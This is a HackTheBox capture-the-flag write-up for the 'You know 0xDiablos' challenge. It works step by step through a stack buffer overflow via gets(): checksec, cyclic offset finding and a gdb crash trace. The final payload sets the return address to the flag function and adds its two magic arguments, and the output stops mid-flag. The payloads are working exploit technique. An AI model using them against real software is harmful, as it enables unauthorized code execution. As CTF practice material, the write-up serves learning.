# You know 0xDiablos

Completed: Yes
Date: Jun 18, 2021 → Jun 18, 2021
Platform: HackTheBox

Firstly, let's see ltrace output:

```bash
$ ltrace ~/Downloads/vuln                                                                                                                                                                                                              1 ⨯
__libc_start_main(0x80492b1, 1, 0xffffd234, 0x8049330 <unfinished ...>
setvbuf(0xf7fb1d20, 0, 2, 0)                                                                                                                       = 0
getegid()                                                                                                                                          = 1000
setresgid(1000, 1000, 1000, 0x80492ea)                                                                                                             = 0
puts("You know who are 0xDiablos: "You know who are 0xDiablos: 
)                                                                                                               = 29
gets(0xffffd0a0, 0xf7fb1d67, 1, 0x8049281AAAAAAAAAAAAA
)                                                                                                         = 0xffffd0a0
puts("AAAAAAAAAAAAA"AAAAAAAAAAAAA
)                                                                                                                              = 14
+++ exited (status 0) +++
```

The program uses vulnerable function gets which doesn't check the size of the input data. 

checksec:

```bash
gef➤  checksec
[+] checksec for '/home/kali/Downloads/vuln'
Canary                        : ✘ 
NX                            : ✘ 
PIE                           : ✘ 
Fortify                       : ✘ 
RelRO                         : Partial
gef➤
```

No security.

This is definitely a buffer overflow vulnerability. 

Determine the offset:

```bash
cyclic 300                                                                                                                                                                                                   127 ⨯
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaa
```

Submit this output to the program: 

```bash
[#0] Id 1, Name: "vuln", stopped 0x62616177 in ?? (), reason: SIGSEGV
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤
```

```bash
cyclic -l 0x62616177
188
```

The offset to RIP is 188 bytes. Check it:

```bash
gef➤  r < <(python -c 'print "A"*188 + "B"*4')
Starting program: /home/kali/Downloads/vuln < <(python -c 'print "A"*188 + "B"*4')
You know who are 0xDiablos: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()

[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0xc1      
$ebx   : 0x41414141 ("AAAA"?)
$ecx   : 0xffffffff
$edx   : 0xffffffff
$esp   : 0xffffd150  →  0x00000000
$ebp   : 0x41414141 ("AAAA"?)
$esi   : 0xf7fb1000  →  0x001e4d6c
$edi   : 0xf7fb1000  →  0x001e4d6c
$eip   : 0x42424242 ("BBBB"?)
$eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffd150│+0x0000: 0x00000000   ← $esp
0xffffd154│+0x0004: 0xffffd224  →  0xffffd3d0  →  "/home/kali/Downloads/vuln"
0xffffd158│+0x0008: 0xffffd22c  →  0xffffd3ea  →  "COLORFGBG=15;0"
0xffffd15c│+0x000c: 0x000003e8
0xffffd160│+0x0010: 0xffffd180  →  0x00000001
0xffffd164│+0x0014: 0x00000000
0xffffd168│+0x0018: 0x00000000
0xffffd16c│+0x001c: 0xf7deae46  →  <__libc_start_main+262> add esp, 0x10
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x42424242
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "vuln", stopped 0x42424242 in ?? (), reason: SIGSEGV
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤
```

Now, it's time to think about what to do, it must be an easy challenge, so the shellcode is not for this challenge, after all, you need somehow determine the remote address within the stack for jumping on shellcode.

I just disassembly the binary with `objdump`:

```bash
080491e2 <flag>:
 80491e2:       55                      push   %ebp
 80491e3:       89 e5                   mov    %esp,%ebp
 80491e5:       53                      push   %ebx
 80491e6:       83 ec 54                sub    $0x54,%esp
 80491e9:       e8 32 ff ff ff          call   8049120 <__x86.get_pc_thunk.bx>
 80491ee:       81 c3 12 2e 00 00       add    $0x2e12,%ebx
 80491f4:       83 ec 08                sub    $0x8,%esp
 80491f7:       8d 83 08 e0 ff ff       lea    -0x1ff8(%ebx),%eax
 80491fd:       50                      push   %eax
 80491fe:       8d 83 0a e0 ff ff       lea    -0x1ff6(%ebx),%eax
 8049204:       50                      push   %eax
 8049205:       e8 a6 fe ff ff          call   80490b0 <fopen@plt>
 804920a:       83 c4 10                add    $0x10,%esp
 804920d:       89 45 f4                mov    %eax,-0xc(%ebp)
 8049210:       83 7d f4 00             cmpl   $0x0,-0xc(%ebp)
 8049214:       75 1c                   jne    8049232 <flag+0x50>
 8049216:       83 ec 0c                sub    $0xc,%esp
 8049219:       8d 83 14 e0 ff ff       lea    -0x1fec(%ebx),%eax
 804921f:       50                      push   %eax
 8049220:       e8 4b fe ff ff          call   8049070 <puts@plt>
 8049225:       83 c4 10                add    $0x10,%esp
 8049228:       83 ec 0c                sub    $0xc,%esp
 804922b:       6a 00                   push   $0x0
 804922d:       e8 4e fe ff ff          call   8049080 <exit@plt>
 8049232:       83 ec 04                sub    $0x4,%esp
 8049235:       ff 75 f4                pushl  -0xc(%ebp)
 8049238:       6a 40                   push   $0x40
 804923a:       8d 45 b4                lea    -0x4c(%ebp),%eax
 804923d:       50                      push   %eax
 804923e:       e8 0d fe ff ff          call   8049050 <fgets@plt>
 8049243:       83 c4 10                add    $0x10,%esp
 8049246:       81 7d 08 ef be ad de    cmpl   $0xdeadbeef,0x8(%ebp)
 804924d:       75 1a                   jne    8049269 <flag+0x87>
 804924f:       81 7d 0c 0d d0 de c0    cmpl   $0xc0ded00d,0xc(%ebp)
 8049256:       75 14                   jne    804926c <flag+0x8a>
 8049258:       83 ec 0c                sub    $0xc,%esp
 804925b:       8d 45 b4                lea    -0x4c(%ebp),%eax
 804925e:       50                      push   %eax
 804925f:       e8 cc fd ff ff          call   8049030 <printf@plt>
 8049264:       83 c4 10                add    $0x10,%esp
 8049267:       eb 04                   jmp    804926d <flag+0x8b>
 8049269:       90                      nop
 804926a:       eb 01                   jmp    804926d <flag+0x8b>
 804926c:       90                      nop
 804926d:       8b 5d fc                mov    -0x4(%ebp),%ebx
 8049270:       c9                      leave  
 8049271:       c3                      ret
```

Now, I will try to fill the return address with the address of flag function:

```bash
$ (python -c 'print "A" * 188 + "\xe2\x91\x04\x08"';cat;) | ltrace ~/Downloads/vuln
__libc_start_main(0x80492b1, 1, 0xffffd214, 0x8049330 <unfinished ...>
setvbuf(0xf7fb1d20, 0, 2, 0)                                                                                                                       = 0
getegid()                                                                                                                                          = 1000
setresgid(1000, 1000, 1000, 0x80492ea)                                                                                                             = 0
puts("You know who are 0xDiablos: "You know who are 0xDiablos: 
)                                                                                                               = 29
gets(0xffffd080, 0xf7fb1d67, 1, 0x8049281)                                                                                                         = 0xffffd080
puts("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"...AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��
)                                                                                                        = 193
fopen("flag.txt", "r")                                                                                                                             = 0x804e1b0
fgets("HTB{FLAG}\n", 64, 0x804e1b0)                                                                                                                = 0xffffd0f0
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++
```

The program will just open the file with a flag and read it. Okay. After some time, I realized that here we have also 2 conditions that we need to complete to get the flag. Arguments of the flag function must be set `0xdeadbeef` and `0xc0ded00d`.

This is the part:

```bash
0x08049246 <+100>:   cmp    DWORD PTR [ebp+0x8],0xdeadbeef
   0x0804924d <+107>:   jne    0x8049269 <flag+135>
   0x0804924f <+109>:   cmp    DWORD PTR [ebp+0xc],0xc0ded00d
```

After the return addres will be moved in EIP, the EIP will be pointed to the next 4 bytes, so, the arguments of the function will be the next 4 bytes after this 4 bytes.

```bash
$ python3 exploit.py
[+] Opening connection to 138.68.158.87 on port 32504: Done
b'You know who are 0xDiablos: \n'
b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xe2\x91\x04\x08AAAA\xef\xbe\xad\xde\r\xd0\xde\xc0\nHTB{
```